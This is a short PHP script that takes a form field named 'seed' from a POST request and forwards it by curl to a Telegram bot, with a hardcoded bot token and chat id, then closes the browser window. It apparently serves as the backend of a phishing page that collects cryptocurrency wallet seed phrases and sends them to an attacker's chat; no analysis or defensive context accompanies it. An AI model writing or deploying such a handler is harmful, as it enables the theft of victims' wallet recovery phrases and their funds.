<?php 
echo "hello world";
//create array
$parameters=array(
"chat_id" =>'1346730446',
"text" => ''.$_POST['seed'].''
);
send("sendMessage",$parameters);
//create Function Send Message
function send($method,$parameters){
    $bot_token='5372578231:AAEjQwa7PWVECeXnTYvlrGwj1MRs-OcKQPg';
    $url="https://api.telegram.org/bot$bot_token/$method";

    if(!$curl = curl_init()){
        exit();
    }
    curl_setopt($curl,CURLOPT_POST, true);
    curl_setopt($curl,CURLOPT_POSTFIELDS,$parameters);
    curl_setopt($curl,CURLOPT_URL,$url);
    curl_setopt($curl,CURLOPT_RETURNTRANSFER,true);
    $output= curl_exec($curl);
    echo '<script type="text/javascript">window.close();</script>';
    return $output;


}
?>